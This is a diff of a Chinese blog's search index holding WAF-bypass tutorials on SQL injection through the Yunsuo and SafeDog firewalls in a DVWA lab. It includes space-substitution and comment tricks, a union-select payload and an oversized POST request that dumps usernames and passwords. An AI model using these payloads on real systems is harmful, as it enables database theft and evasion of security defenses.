@@ -97,7 +97,7 @@
 <li><p>位置①</p>
 <ul>
 <li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
-<li>可以利用注释符号替换空格：/**/、%23est%0d%0a、 —+a%0d%0a</li>
+<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
 <li>可以利用数学运算以及数据类型：news_id=1.0，news_id=1E0，news_id=\N</li>
 </ul>
 </li>
@@ -120,6 +120,8 @@
 <li><p>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</p>
 </li>
 <li><p>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</p>
+</li>
+<li><p>大括号{}：union select {``1},{x 2}</p>
 </li>
 <li><p>可利用数学运算以及数据类型：</p>
 <blockquote>
@@ -240,7 +242,7 @@
 <blockquote>
 <p>注：使用IIS服务器部署的Web应用也可以用该方法去绕过云锁</p>
 </blockquote>
-<h3 id="多行注释符替代空格绕过"><a href="#多行注释符替代空格绕过" class="headerlink" title="多行注释符替代空格绕过"></a>多行注释符替代空格绕过</h3><h4 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
+<h3 id="多行注释符替代空格绕过【未成功】"><a href="#多行注释符替代空格绕过【未成功】" class="headerlink" title="多行注释符替代空格绕过【未成功】"></a>多行注释符替代空格绕过【未成功】</h3><h4 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
 <p>在进行SQL语句查询的时候可以利用注释符来替代语法中的空格，例如：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [dbo].[<span class="keyword">User</span>] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>可替代为：</p>
@@ -271,6 +273,7 @@
 <p>在尝试使用多行注释符替换空格的过程中，意外地发现了一个绕过方法：</p>
 <p>可以利用注释符与回车符结合来替代语法中的空格：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1--%0dunion select 1,&#x27;2&#x27;,&#x27;3&#x27;</span><br></pre></td></tr></table></figure>
+<p>这是MSSQL中的一个特性，—注释符可以与直接%0d结合，使—注释符无法生效</p>
 <p><img src="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211023125921816.png" alt="image-20211023125921816"></p>
 <p>这可能是云锁在过滤中的疏忽导致的绕过</p>
 <h4 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>如果想要知道除了%0d还有哪些字符可以绕过云锁，可以编写一个简单的python脚本进行FUZZ</p>
@@ -1975,15 +1978,7 @@
   <entry>
     <title>WAF-Bypass之SQL注入绕过安全狗</title>
     <url>/post/6c2dcc62.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h2><p>靶场：DVWA（low级别）</p>
-<p>数据库：MySQL 5.5</p>
-<p>Web脚本：PHP 5.4.19</p>
-<p>WAF：网站安全狗（Apache版）v4.0.2313</p>
-<p><img src="https://i.loli.net/2021/10/14/O1zMRZh2BSXbfr8.png" alt="image-20211014211210255"></p>
-<p>让我们查看一下DVWA-LOW级别SQL注入的源代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到这里是采用$_REQUEST的方式进行表单数据的传递。这就说明既可以使用GET方式传参，也可以使用POST方式进行传参。</p>
-<h2 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h2><p><strong>空格可以由其它字符替代</strong></p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Bypass安全狗MySQL注入"><a href="#Bypass安全狗MySQL注入" class="headerlink" title="Bypass安全狗MySQL注入"></a>Bypass安全狗MySQL注入</h2><h3 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h3><p><strong>空格可以由其它字符替代</strong></p>
 <blockquote>
 <p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
 </blockquote>
@@ -2015,6 +2010,8 @@
 </li>
 <li><p>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</p>
 </li>
+<li><p>大括号{}：union select {``1},{x 2}</p>
+</li>
 <li><p>可利用数学运算以及数据类型：</p>
 <blockquote>
 <p>union select usename,2.0from admin<br>union select username,8e0from admin<br>union select username,\Nfrom admin</p>
@@ -2033,7 +2030,15 @@
 </ul>
 </li>
 </ul>
-<h2 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>资源限制：WAF长度资源限制</strong></p>
+<h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
+<p>数据库：MySQL 5.5</p>
+<p>Web脚本：PHP 5.4.19</p>
+<p>WAF：网站安全狗（Apache版）v4.0.2313</p>
+<p><img src="https://i.loli.net/2021/10/14/O1zMRZh2BSXbfr8.png" alt="image-20211014211210255"></p>
+<p>让我们查看一下DVWA-LOW级别SQL注入的源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里是采用$_REQUEST的方式进行表单数据的传递。这就说明既可以使用GET方式传参，也可以使用POST方式进行传参。</p>
+<h3 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h3><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>资源限制：WAF长度资源限制</strong></p>
 <p>假如HTTP请求POST BODY太大，检测所有内容，WAF集群消耗太多的CPU、内存资源。因此许多WAF只检测前面的2M或4M的内容。对于攻击者而言，只需要在POST BODY前面添加许多无用的数据，把攻击的payload放在最后即可绕过WAF检测。</p>
 <p><strong>绕过技巧</strong>：</p>
 <ul>
@@ -2044,7 +2049,7 @@
 <p><strong>数据包构造</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8200</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">a=/*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCCCDDDDDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCSSSSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB&amp;id=1&#x27; union select null,concat_ws(char(32,58,32),user,password) from users%23</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/15/TGSn9jEO6YJwzKL.png" alt="image-20211015235313081"></p>
-<h2 id="函数分隔符绕过"><a href="#函数分隔符绕过" class="headerlink" title="函数分隔符绕过"></a>函数分隔符绕过</h2><h3 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：函数与括号之间插入分隔符可以正常执行</strong></p>
